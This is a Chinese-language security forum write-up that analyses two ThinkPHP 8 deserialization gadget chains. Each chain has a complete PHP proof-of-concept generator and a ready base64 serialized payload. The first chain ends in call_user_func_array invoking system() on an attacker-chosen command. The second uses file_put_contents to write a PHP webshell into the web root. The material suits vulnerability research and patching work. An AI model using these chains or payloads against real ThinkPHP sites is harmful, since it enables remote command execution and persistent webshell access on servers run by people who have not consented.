# Thinkphp8 反序列化链分析

> **来源**: https://forum.butian.net/share/3134  
> **文章ID**: 3134

---

反序列化链1
------

#### 分析过程

Thinkphp8 反序列化调用链从ResourceRegister#\_\_destruct()开始，最终调用到Validate#is()下，该方法下存在一个call\_user\_func\_array()可供我们调用执行命令

反序列化链的起点在ResourceRegister#\_\_destruct()下，其中$registered初始化值为false，可以调用到$this->register()，在register下由于$this->resource可控，所以我们可以构造$this->resource = new Resource()，Resource类下存在一个parseGroupRule方法。

```php
public function __destruct()
{
    if (!$this->registered) {
        $this->register();
    }
}
```

![image-20240702110242405.png](images/attach-005f3e413484e6605120f01f2c99e5543bf16d0e.png)

这里传递进去的参数为$this->resource->getRule()，在该方法里面返回的是$this->rule的内容，该值是可控的

```php
public function getRule()
{
    return $this->rule;
}
```

在parseGroupRule方法下，先判断$rule中是否包含"."，如果条件成立的话会进入到if语句中，接着会通过explode函数以“.”为分隔符划分$rule，接着进入到foreach中进行拼接字符串。

由于$option=$this->options，所以$options数组是可控的，在foreach语句中，代码将$val的内容和$option\['var'\]\[$val\]拼接起来，如果$option\['var'\]\[$val\]的值可控且是一个对象的时候，会调用到该对象的\_\_toString()，这里需要利用到的对象是Conversion类的\_\_toString()

可以构造$rule的值为"1.1"，$this->option=\["var"=>\["1"=>new Conversion()\]\]，那么当执行到字符串拼接部分的代码时，就会调用到Conversion类的\_\_toString方法。

![image-20240702111107532.png](images/attach-ec54d28ac3b65625e685adf2c117412a08336c4d.png)  
由于这里Conversion类的类型为trait，是不可以通过new Conversion()的形式实例化成一个对象的，所以这里需要用到Pivot类，该类继承自Model类，而Model类下使用到了model\\concern\\Conversion

![image-20240702155705879.png](images/attach-db0d0ba24ef360b7ed52ff44e90c55a74abc9ff1.png)

在Conversion#toString()中先调用$this->toJson()，接着按照下面的调用栈，跟进到appendAttrToArray()

```php
Conversion#__toString()  
Conversion#toJson()  
Conversion#toArray()  
Conversion#appendAttrToArray()
```

![屏幕截图 2024-07-02 121909.png](images/attach-12e785107bceac025edbeb61ce5b8c483d0b52cc.png)

在appendAttrToArray()中通过is\_array()来判断$name是否是数组，这里的$key和$name的值通过$this->append得到

```php
$this->append = ["test"=>[]]   //根据要求构造了$this->append的值

foreach ($this->append as $key => $name) {
    $this->appendAttrToArray($item, $key, $name, $visible, $hidden);
}
```

接着进入到$this->getRelationWith()中，在Validate类的\_\_call魔术方法中，使用到了call\_user\_func\_array()，通过call\_user\_func\_array()可以构造命令执行，所以我们的反序列链需要调用到Validate#\_\_call()

这里需要令$relation的值为Validate对象，那么当程序执行到$relation->hidden()时，由于Validate对象中并不存在hidden()方法，就会调用该对象里的\_\_call()魔术方法。

而进入到$relation->hidden()的条件是$hidden\[$key\]必须存在，$hidden\[$key\]是可控的，所以先进入到$this->getRelation()中看看如何令$this->getRelation()的返回值$relation为Validate对象

![image-20240702142904242.png](images/attach-03bcaad4f3ab354c2ebfecaa92613c01b2032d2f.png)

这里我们利用return $this->relation\[$name\]来返回我们的Validate对象。因为这里$name参数实际上就是传递进来的$this->append的$key，$this->relation的内容可控，这样返回的$this->relation\[$name\]就是new Validate()了

```php
$this->append = ["test"=>[]]         
$this->$relation = ["test"=>new Validate()]
```

![image-20240702143737064.png](images/attach-5e499d35bf49cdb311253716ee59b5da40d1da79.png)

得到了$relation之后，执行到$relation->hidden($hidden\[$key\])时，就会调用到Validate#\_\_call()，参数是$hidden\[$key\]

```php
if ($relation) {
    if (isset($visible[$key])) {
        $relation->visible($visible[$key]);
    } elseif (isset($hidden[$key])) {
        $relation->hidden($hidden[$key]);
    }
}
```

跟进到Validate#\_\_call()，该方法下通过call\_user\_func\_array(\[$this, 'is'\], $args) 调用到该类下的is()方法，可以看到在call\_user\_func\_array()调用的回调函数是$this->type\[$rule\]，这里$rule的值为hidden，$value就是$hidden\[$key\]

```php
$this->type = ["hidden"=>"system"]             //通过$this->type[$rule]得到回调函数system
```

![image-20240702150230405.png](images/attach-e7f646185d4d5ba6eb8ea42cc26b468e286efdd9.png)

参数$\[value\]这里有一个坑，当使用call\_user\_func\_array()时，它接受两个变量，第一个变量是回调函数，第二个参数是参数数组，将回调函数需要的参数放到\[$value\]里，所以这里call\_user\_func\_array(“system”, \[$value\])只能接收一个字符串参数$value

通过上面的分析我们已经知道$value的值是通过$hidden\[$key\]得到的，实际上$hidden\[$key\]的值是一个数组，所以这里导致参数变成了\[\["whoami"\]\]这种形式  
$hidden从Conversion#toArray()中得到，如果我们构造$this->hidden=\["test"=>"whoami"\]的形式，那么程序就会进入到$hidden\[$val\]=true，得到的$hidden=\["whoami"=>"true"\]。

```php
foreach ($this->hidden as $key => $val) {
    if (is_string($val)) {
        if (str_contains($val, '.')) {
            [$relation, $name] = explode('.', $val);
            $hidden[$relation][] = $name;
        } else {
            $hidden[$val] = true;
        }
    } else {
        $hidden[$key] = $val;
    }
}
```

所以我们需要一个类将参数转换为字符串，最终找到的可用类为ConstStub，里面的\_\_toString()返回一个字符串形式的$this->value，$this->value可控，所以我们可以构造所需的类。当程序执行到call\_user\_func\_array(“system”, \[new ConstStub()\])时就会调用ConstStub的魔法方法\_\_toString()返回一个字符串calc

```php
$this->hidden = ["test"=> new ConstStub()]

namespace Symfony\Component\VarDumper\Caster{
    use Symfony\Component\VarDumper\Cloner\Stub;
    class ConstStub extends Stub{}
}
namespace Symfony\Component\VarDumper\Cloner{
    class Stub{
        public $value = "calc";
    }
}
```

![image-20240702153851211.png](images/attach-b01b4686a6fe211b284c46399a51283462df7866.png)

#### 反序列化链调用链

```php
ResourceRegister#__destruct()
ResourceRegister#register()
Resource#parseGroupRule()
Conversion#__toString()
Conversion#toJson()
Conversion#toArray()
Conversion#appendAttrToArray()
Conversion#getRelationWith()
Validate#__call()
Validata#is()
```

#### 完整poc

```php
<?php
namespace Symfony\Component\VarDumper\Caster{
    use Symfony\Component\VarDumper\Cloner\Stub;
    class ConstStub extends Stub{}
}

namespace Symfony\Component\VarDumper\Cloner{
    class Stub{
        public $value = "calc"; //cmd
    }
}
namespace think {
    use Symfony\Component\VarDumper\Caster\ConstStub;
    class Validate{
        protected $type;
        public function __construct(){
            $this->type = ["hidden"=>"system"];
        }
    }
    abstract class Model {
        protected $append;
        protected $relation;
        protected $hidden;
        public function __construct() {
            $this->hidden = ["test"=>new ConstStub()];
            $this->append = ["test"=>[]];
            $this->relation = ["test"=>new Validate()];
        }
    }
}

namespace think\model {
    use think\Model;
    class Pivot extends Model {}
}

namespace think\route {
    use think\model\Pivot;
    class ResourceRegister{
        protected $resource;
        public function __construct(){
            $this->resource = new Resource();
        }
    }
    abstract class Rule {
        protected $rule;
        protected $option;
        function __construct(){
            $this->rule = "1.2";
            $this->option = ["var"=>["1"=>new Pivot()]];
        }
    }
    class RuleGroup extends Rule{
        public function __construct(){
            parent::__construct();
        }
    }
    class Resource extends RuleGroup {
        public function __construct(){
            parent::__construct();
        }
    }
}

namespace {
    $obj = new think\route\ResourceRegister();
    echo base64_encode(serialize($obj));
}
/*
TzoyODoidGhpbmtccm91dGVcUmVzb3VyY2VSZWdpc3RlciI6MTp7czoxMToiACoAcmVzb3VyY2UiO086MjA6InRoaW5rXHJvdXRlXFJlc291cmNlIjoyOntzOjc6IgAqAHJ1bGUiO3M6MzoiMS4yIjtzOjk6IgAqAG9wdGlvbiI7YToxOntzOjM6InZhciI7YToxOntpOjE7TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjM6e3M6OToiACoAYXBwZW5kIjthOjE6e3M6NDoidGVzdCI7YTowOnt9fXM6MTE6IgAqAHJlbGF0aW9uIjthOjE6e3M6NDoidGVzdCI7TzoxNDoidGhpbmtcVmFsaWRhdGUiOjE6e3M6NzoiACoAdHlwZSI7YToxOntzOjY6ImhpZGRlbiI7czo2OiJzeXN0ZW0iO319fXM6OToiACoAaGlkZGVuIjthOjE6e3M6NDoidGVzdCI7Tzo0NDoiU3ltZm9ueVxDb21wb25lbnRcVmFyRHVtcGVyXENhc3RlclxDb25zdFN0dWIiOjE6e3M6NToidmFsdWUiO3M6NDoiY2FsYyI7fX19fX19fQ==
 */
```

反序列化链2
------

#### 分析过程

第二条利用链的入口和第一条利用链的入口是一样的，都在ResourceRegister#\_\_destruct()下，通过第二条利用链可以通过file\_put\_contents写入webshell到网站目录下，根据下面的调用栈跟进到Conversion#\_\_toArray()下

```php
ResourceRegister#__destruct()
ResourceRegister#__register()
Resource#__parseGroupRule()
Conversion#__toString()
Conversion#toJson()
Conversion#toArray()
```

$visible\[$key\]是可控的，这里会进入到$this->getAttr()，参数$key也是可控的，在getAttr方法中会调用$this->getValue()

![image-20240704171549530.png](images/attach-203ca4bf37aafb9d370ff63583733063ae3287b2.png)

![image-20240704171938756.png](images/attach-5751b26a0b98293d149273486693cfb71356d4ed.png)

在getValue()中，跟进$this->getRealFieldName()可以看到返回值是可控的，接着会判断$this->get中是否存在$fieldName的键值，这里的$this->get是可控的

![image-20240704172126765.png](images/attach-cd9dd1fbba83eae1ab189aef0c01a6fd3945e904.png)

跟进到getJsonValue()中，可以看到在568行可以通过$closure($value\[$key\],$value)，参数全都是可控的，就可以通过file\_put\_contents去写入webshell

![image-20240704173122405.png](images/attach-04cabd22ceca81d44d3516f45454ea7fc6adf4bf.png)

在代码中添加一个反序列化的入口点，执行反序列化之后可以看到在网站public目录下会生成一个webshell文件

![image-20240705095332603.png](images/attach-f0353b106768da15b3a10365d5468c2b2b1e0661.png)

#### 反序列化调用链

```php
ResourceRegister#__destruct()
ResourceRegister#__register()
Resource#__parseGroupRule()
Conversion#__toString()
Conversion#toJson()
Conversion#toArray()
Attribute#getAttr()
Attribute#getValue()
Attribute#getJsonValue()
```

#### 完整poc

```php
<?php
namespace think {
    abstract class Model {
        private $data;
        protected $visible;
        protected $jsonAssoc;
        protected $json;
        private $withAttr;
        public function __construct() {
            $this->jsonAssoc = true;
            $this->data = ["test"=>["test"=>"kakaxsxs.php", "test2"=>"<?php phpinfo()?>"]];
            $this->visible = ["test"=>"test"];
            $this->json = ["test"=>"test"];
            $this->withAttr = ["test"=>["test"=>"file_put_contents"]];
        }
    }
}
namespace think\model {
    use think\Model;
    class Pivot extends Model {}
}
namespace think\route {
    use think\model\Pivot;
    class Rule {
        protected $rule;
        protected $option;
        public function __construct() {
            $this->rule = "1.1";
            $this->option = ["var"=>["1"=>new Pivot()]];
        }
    }
    class RuleGroup extends Rule {
        public function __construct() {
            parent::__construct();
        }
    }
    class Resource extends RuleGroup {
        public function __construct() {
            parent::__construct();
        }
    }
    class ResourceRegister {
        protected $resource;
        public function __construct() {
            $this->resource = new Resource();
        }
    }
}

namespace {
    $obj = new think\route\ResourceRegister();
    echo base64_encode(serialize($obj));
}

/*
TzoyODoidGhpbmtccm91dGVcUmVzb3VyY2VSZWdpc3RlciI6MTp7czoxMToiACoAcmVzb3VyY2UiO086MjA6InRoaW5rXHJvdXRlXFJlc291cmNlIjoyOntzOjc6IgAqAHJ1bGUiO3M6MzoiMS4xIjtzOjk6IgAqAG9wdGlvbiI7YToxOntzOjM6InZhciI7YToxOntpOjE7TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjU6e3M6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NDoidGVzdCI7YToyOntzOjQ6InRlc3QiO3M6MTI6Imtha2F4c3hzLnBocCI7czo1OiJ0ZXN0MiI7czoxNzoiPD9waHAgcGhwaW5mbygpPz4iO319czoxMDoiACoAdmlzaWJsZSI7YToxOntzOjQ6InRlc3QiO3M6NDoidGVzdCI7fXM6MTI6IgAqAGpzb25Bc3NvYyI7YjoxO3M6NzoiACoAanNvbiI7YToxOntzOjQ6InRlc3QiO3M6NDoidGVzdCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjQ6InRlc3QiO2E6MTp7czo0OiJ0ZXN0IjtzOjE3OiJmaWxlX3B1dF9jb250ZW50cyI7fX19fX19fQ==
*/
```
